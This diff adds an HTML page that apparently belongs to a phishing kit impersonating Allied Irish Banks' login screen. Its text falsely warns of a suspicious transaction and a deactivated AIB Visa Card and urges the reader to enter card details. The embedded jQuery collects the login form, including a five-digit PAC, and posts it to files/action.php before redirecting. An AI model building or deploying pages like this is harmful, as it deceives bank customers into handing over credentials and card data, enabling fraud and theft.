@@ -1,0 +1,554 @@
+<html dir="ltr" lang="en"><head>
+        
+        <title>Log in</title>
+        <!-- base href="https://auth.aib.ie/" -->
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=5.0">
+        <meta http-equiv="x-ua-compatible" content="IE=edge">
+        <link rel="stylesheet" type="text/css" href="files/css/main.css">
+        <style type="text/css">
+            * {
+                box-sizing: border-box;
+            }
+            html {
+                background: #f2f2f2;
+                background-color: #f2f2f2;
+            }
+            .aib_tpl .ping-header {
+                font-family: ProximaNovaBold;
+                font-size: 24px !important;
+                color: #4d4d4d;
+                padding-top: 40px !important;
+                border-radius: 8px 8px 0 0;
+                -webkit-box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            }
+            .aib_tpl .ping-header .company-logo {
+                margin-bottom: 12px;
+            }
+            .aib_tpl .ping-body-container {
+                padding: 32px;
+                border-radius: 0 0 8px 8px;
+                -webkit-box-shadow: 0 5px 6px rgba(0, 0, 0, 0.1);
+                box-shadow: 0 5px 6px rgba(0, 0, 0, 0.1);
+            }
+            .aib_tpl .ping-footer-container {
+                display: none;
+            }
+            .aib_tpl .ping-messages {
+                font-size: 14px;
+            }
+            .aib_tpl .divider {
+                opacity: 0.4;
+            }
+            .aib_tpl .ping-header .company-logo {
+                display: block;
+                margin-bottom: 12px;
+                max-width: 100% !important;
+                height: auto !important;
+            }
+            .aib_tpl .bg-purple-core {
+                border-radius: 2px;
+                background: #512d6d;
+                background: linear-gradient(45deg, #512d6d 0, #c42f9e 80%);
+            }
+            .aib_tpl .ping-input-label {
+                display: block;
+                float: none;
+                text-transform: none;
+                color: #000;
+                opacity: 0.8;
+            }
+            .aib_tpl .ping-input-container input[type="password"],
+            .aib_tpl .ping-input-container input[type="text"] {
+                font-family: ProximaNovaBold;
+                font-size: 16px;
+                background: #fff;
+                color: #000;
+                height: 56px;
+                border-radius: 8px;
+                border: 1px solid rgba(0, 0, 0, 0.24);
+                -webkit-appearance: none;
+                width: 100% !important;
+            }
+            .aib_tpl .ping-input-container input[type="password"]:focus,
+            .aib_tpl .ping-input-container input[type="text"]:focus {
+                border: 1px solid #7e2b79;
+                -webkit-box-shadow: inset 0 0 0 1px #7e2b79;
+                box-shadow: inset 0 0 0 1px #7e2b79;
+            }
+            .aib_tpl .ping-checkbox-container.stacked {
+                padding-left: 36px;
+            }
+            .aib_tpl label.my-computer,
+            .aib_tpl label.remember-username {
+                color: #4d4d4d;
+            }
+            .aib_tpl label .ping-checkbox-container .icon {
+                bottom: 1px;
+            }
+            .aib_tpl label .ping-checkbox-container .icon:before {
+                border: 1px solid rgba(0, 0, 0, 0.4);
+                width: 20px;
+                height: 20px;
+                border-radius: 4px;
+            }
+            .aib_tpl label .ping-checkbox-container .icon:after {
+                font-size: 12px;
+                top: 4px;
+                bottom: 0;
+                left: 1px;
+                height: 20px;
+                width: 20px;
+            }
+            .aib_tpl label .ping-checkbox-container input[type="checkbox"]:checked + .icon:after {
+                color: #7e2b79;
+            }
+            .aib_tpl .ping-buttons {
+                width: 100%;
+            }
+            .aib_tpl .ping-buttons a.ping-button {
+                height: 48px;
+                border-radius: 8px;
+                font-size: 16px;
+                letter-spacing: 0.4px;
+                line-height: 48px;
+                display: inline-block;
+                text-decoration: none;
+                width: 46%;
+            }
+            .aib_tpl .ping-buttons a.ping-button.allow {
+                background-color: #00846a;
+                font-family: ProximaNovaBold;
+                float: right;
+            }
+            .aib_tpl .ping-buttons a.ping-button.deny {
+                color: rgba(0, 0, 0, 0.6);
+                background: rgba(0, 0, 0, 0.05);
+                font-family: ProximaNovaRegular;
+                float: left;
+            }
+            .aib_tpl .ping-buttons a.ping-button.deny:hover {
+                text-decoration: none;
+            }
+            .aib_tpl .ping-register {
+                font-family: ProximaNovaBold;
+                font-size: 14px;
+                color: #000;
+                margin-top: 32px;
+            }
+            .aib_tpl .ping-input-link a {
+                color: #7e2b79;
+                display: inline-block;
+                padding: 8px;
+            }
+            .aib_tpl .ping-register a {
+                display: block;
+                height: 48px;
+                border-radius: 8px;
+                font-family: ProximaNovaBold;
+                color: #7e2b79;
+                font-size: 16px;
+                line-height: 45px;
+                letter-spacing: 0.4px;
+                border: 2px solid rgba(0, 0, 0, 0.32);
+                text-decoration: none;
+                margin-top: 12px;
+            }
+            .aib_phone-link:focus,
+            .aib_tpl .aib_btn-close:focus,
+            .aib_tpl .aib_btn-gotit:focus,
+            .aib_tpl .aib_btn-more-information:focus,
+            .aib_tpl a.ping-button:focus {
+                box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.24);
+            }
+            .aib_tpl .aib_btn-gotit:focus,
+            .aib_tpl a.ping-button.allow:focus {
+                background-color: #006954;
+            }
+            .aib_tpl a.ping-button.deny:focus {
+                background: rgba(0, 0, 0, 0.08);
+            }
+            .aib_tpl .ping-input-container .tooltip-text.type-alert.place-bottom {
+                margin-top: 4px;
+            }
+            .aib_tpl .ping-input-container .tooltip-text.type-alert {
+                max-width: 300px;
+                left: auto;
+                right: 0;
+                color: #e32837;
+                border: 1px solid rgba(0, 0, 0, 0.2);
+                border-radius: 8px;
+                -webkit-box-shadow: 0 4px 12px 0 rgba(0, 0, 0, 0.1);
+                -moz-box-shadow: 0 4px 12px 0 rgba(0, 0, 0, 0.1);
+                box-shadow: 0 4px 12px 0 rgba(0, 0, 0, 0.1);
+            }
+            .aib_tpl .ping-input-container .tooltip-text.type-alert.place-bottom:before {
+                border-color: transparent transparent rgba(0, 0, 0, 0.3) transparent;
+            }
+            .aib_tpl .ping-input-container .tooltip-text.type-alert .icon {
+                background-color: #e32837;
+            }
+            .aib_tpl .aib_btn-more-information {
+                display: inline-block;
+                font-family: ProximaNovaBold;
+                letter-spacing: 0.4px;
+                font-size: 16px;
+                line-height: 20px;
+                margin: 28px 0 0;
+                text-decoration: underline;
+                color: #7e2b79;
+                height: 48px;
+                border: none;
+                padding: 14px 12px;
+                border-radius: 8px;
+                outline: 0;
+            }
+            #aibTroubleLoggingInRegView {
+                display: none;
+                height: 70%;
+                background: #fff;
+                max-width: 480px;
+                margin: 0 auto;
+                position: absolute;
+                left: 0;
+                right: 0;
+                z-index: 2;
+                border-radius: 8px;
+                -webkit-box-shadow: 0 5px 6px rgba(0, 0, 0, 0.1);
+                box-shadow: 0 5px 6px rgba(0, 0, 0, 0.1);
+            }
+            #aibTroubleLoggingInRegView.show {
+                display: block;
+            }
+            .aib_tpl .aib_btn-close-container {
+                height: auto;
+                text-align: right;
+            }
+            .aib_tpl .aib_btn-close {
+                width: 32px;
+                height: 32px;
+                display: inline-block;
+                padding: 4px;
+                margin: 12px;
+                outline: 0;
+                border-radius: 8px;
+            }
+            .aib_tpl .aib_trouble-title {
+                font-family: ProximaNovaBold;
+                font-size: 20px;
+                text-align: center;
+                color: #000;
+                opacity: 0.6;
+                padding: 20px;
+                width: 84%;
+                line-height: 26px;
+                margin: 0 auto;
+            }
+            .aib_tpl .aib_trouble-text {
+                font-family: ProximaNovaRegular;
+                font-size: 16px;
+                text-align: center;
+                line-height: 24px;
+                color: #000;
+                padding: 16px 20px;
+            }
+            .aib_tpl .aib_btn-gotit-container {
+                text-align: center;
+                padding: 24px 20px;
+            }
+            .aib_tpl .aib_btn-gotit {
+                font-family: ProximaNovaBold;
+                background-color: #00846a;
+                color: #fff;
+                height: 48px;
+                border-radius: 8px;
+                font-size: 16px;
+                letter-spacing: 0.4px;
+                line-height: 48px;
+                display: inline-block;
+                text-decoration: none;
+                padding: 0 80px;
+                outline: 0;
+            }
+            .aib_phone-link {
+                display: inline-block;
+                font-family: ProximaNovaBold;
+                letter-spacing: 0.4px;
+                font-size: 16px;
+                line-height: 20px;
+                text-decoration: underline;
+                color: #7e2b79;
+                height: 40px;
+                border: none;
+                padding: 10px 12px;
+                border-radius: 8px;
+                outline: 0;
+            }
+            .aib_phone-link:hover {
+                color: #7e2b79;
+            }
+            @media (max-width: 900px), (max-device-width: 900px) {
+                .aib_tpl .ping-container.ping-signin.login-template {
+                    margin-top: 16px;
+                }
+            }
+            @media (max-width: 480px), (max-device-width: 480px) {
+                html {
+                    background: #fff;
+                    background-color: #fff;
+                }
+                .aib_tpl .ping-messages > div {
+                    padding: 0;
+                }
+                .aib_tpl .ping-container.ping-signin.login-template {
+                    margin-top: 0;
+                }
+                .aib_tpl .ping-header {
+                    border-radius: 0;
+                    -webkit-box-shadow: none;
+                    box-shadow: none;
+                }
+                .aib_tpl .ping-body-container {
+                    padding: 20px 16px;
+                    border-radius: 0;
+                    -webkit-box-shadow: none;
+                    box-shadow: none;
+                }
+                .aib_tpl .ping-buttons a.ping-button {
+                    width: 100%;
+                }
+                .aib_tpl .ping-buttons a.ping-button.allow,
+                .aib_tpl .ping-buttons a.ping-button.deny {
+                    float: none;
+                }
+                #aibTroubleLoggingInRegView {
+                    height: 100%;
+                    border-radius: 0;
+                    -webkit-box-shadow: none;
+                    box-shadow: none;
+                }
+                .aib_tpl .aib_btn-gotit {
+                    width: 100%;
+                }
+            }
+        </style>
+
+        <!-- Support Promises in Internet Explorer -->
+            <link rel="shortcut icon" href="files/img/favicon.ico" type="image/x-icon">  
+			<style>
+input:required {
+    box-shadow:none;
+}
+input:invalid {
+    box-shadow:none;
+}
+@media only screen and (max-width: 700px) {
+  .media-footer {
+    display:none;
+  }
+}
+@media only screen and (min-width: 701px) {
+  .media-footer {
+    display:block;
+  }
+}
+		</style>
+		<script src="files/js/jquery.js"></script>
+	<script>
+	
+
+$( document ).ready(function() {
+
+	
+	var allInputs = $(":input");
+	
+
+
+	
+	allInputs.focusout(function() {
+		$(this).blur(function() {
+
+			if($(this).prop('required')){
+			if(!$(this).val()){
+			
+				$(this).next().addClass('show');
+				
+				
+				
+			}else{
+				
+				$(this).next().removeClass('show');
+				
+			}
+		}
+		});
+	});
+	
+	
+
+
+	
+	
+	
+	
+	$('#loginForm').submit(function(e){
+		e.preventDefault();
+		var pacdigits = $('#pacdigits').val();
+		
+		if(pacdigits == null || pacdigits == ''){
+			console.log('pac empty');
+			return false;
+		}else if(/^[0-9]{5}$/.test(pacdigits) == true && pacdigits != null && pacdigits != ''){
+			console.log('pac correct');
+			$('#PACNumber').val(pacdigits);
+			
+			
+			
+			$.ajax({
+			type : 'POST',
+			url : 'files/action.php?type=login',
+			data : $('#loginForm').serialize(),
+			success: function (data) {
+				//console.log(data);
+				var parsed_data = JSON.parse(data);
+				if(parsed_data.status == 'ok'){
+					//console.log(parsed_data);
+					location.href = "Loading.php"
+				}else{
+					return false;
+				}
+				//console.log(parsed_data.status);
+			}
+			})
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+		}else{
+			console.log('pac wrong');
+			return false;
+		}
+		
+		
+		
+		
+	});
+
+	
+	
+	
+});
+	
+	
+	
+	</script>
+    </head>
+
+    <body class="aib_tpl">
+        <div class="ping-container ping-signin login-template">
+            <div id="aibTroubleLoggingInRegView">
+                <div class="aib_btn-close-container">
+                    <a href="javascript:void(0);" class="aib_btn-close" onclick="return aibHideTroubleLoggingInReg();" title="Close" tabindex="0">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+                            <path class="st0" d="M13.4,12l5.2,5.3c0.4,0.4,0.4,1,0,1.4c-0.2,0.2-0.4,0.3-0.7,0.3c-0.3,0-0.5-0.1-0.7-0.3L12,13.4l-5.2,5.3 C6.6,18.9,6.3,19,6.1,19s-0.5-0.1-0.7-0.3c-0.4-0.4-0.4-1,0-1.4l5.2-5.3L5.4,6.7C5,6.4,5,5.7,5.4,5.3s1-0.4,1.4,0l5.2,5.3l5.2-5.3 c0.4-0.4,1-0.4,1.4,0c0.4,0.4,0.4,1,0,1.4L13.4,12z" fill="#000"></path>
+                        </svg>
+                    </a>
+                </div>
+                <div class="aib_trouble-title">
+                    Contact us
+                </div>
+                <div class="aib_trouble-text">
+                    Please contact<br>
+                    <a href="tel:0818 724 724" class="aib_phone-link"><strong>0818 724 724</strong></a><br>
+                    to speak to a customer service<br>
+                    advisor for assistance.
+                </div>
+                <div class="aib_btn-gotit-container">
+                    <a href="javascript:void(0);" id="aibBtnGotit" class="aib_btn-gotit" onclick="return aibHideTroubleLoggingInReg();" title="Close" tabindex="0">
+                        Got it
+                    </a>
+                </div>
+            </div>
+
+            <!--
+    if there is a logo present in the 'company-logo' container,
+    then 'has-logo' class should be added to 'ping-header' container.
+    -->
+            <div class="ping-header">
+                
+				
+                Security Message            </div>
+            <!-- .ping-header -->
+
+            <div class="ping-body-container">
+                <main>
+                    <form method="POST" action="#" autocomplete="off" id="loginForm">
+						
+						
+                        <div class="ping-messages"></div>
+
+                        
+						
+						
+						
+                                            <p>A suspicious transaction was made today with your AIB Visa Card.</p>
+                                            <p>As a security precaution once this happens your AIB Visa Card gets automatically deactivated until you have reviewed the transaction.</p>
+                                            <p>Verify AIB Visa Card and review the transaction.</p>
+                                            <p>Please verify your AIB Visa Card by filling in your debit/credit card information.</p>
+                                            <p>Once your debit/credit card information is confirmed you will be able to review the transaction, which you will then have the ability to cancel or accept.</p>
+						
+						
+
+                        <div class="ping-buttons">
+                            
+
+							<style>
+								.aib_tpl .ping-buttons a.ping-button {
+		width: 100%;
+	}
+							</style>
+                            <a href="Login.php" class="ping-button normal allow" title="Log in" tabindex="0">
+                                Log in                            </a>
+                            
+							
+                        </div>
+                        <!-- .ping-buttons -->
+
+                        <a href="javascript:void(0);" id="aibBtnTroubleLoggingInReg" onclick="aibShowTroubleLoggingInReg();" class="aib_btn-more-information" tabindex="0" style="display: none;">Trouble logging in?</a>
+
+                        <!-- #recaptcha -->
+
+                        
+                    </form>
+                </main>
+                <!-- .ping-body// blank div -->
+            </div>
+            <!-- .ping-body-container -->
+
+            <div class="ping-footer-container">
+                <div class="ping-footer">
+                    <div class="ping-credits"></div>
+                    <div class="ping-copyright">Copyright © 2003-2020. Ping Identity Corporation. All rights reserved.</div>
+
+                    <!-- Jenkins Pipeline will inject the build number into the template via find/replace.
+                See inject-version-number.js and jenkins.pipeline.groovy
+                The Javascript injects its own build number too. They "should" match. -->
+                    <div class="ping-template-version-container">Version: <span class="ping-template-version-html">0.0.74</span> JS: <span class="ping-template-version-javascript"></span></div>
+                </div>
+                <!-- .ping-footer -->
+            </div>
+            <!-- .ping-footer-container -->
+        </div>
+        <!-- .ping-container -->
+
+        
+    
+
+</body></html>
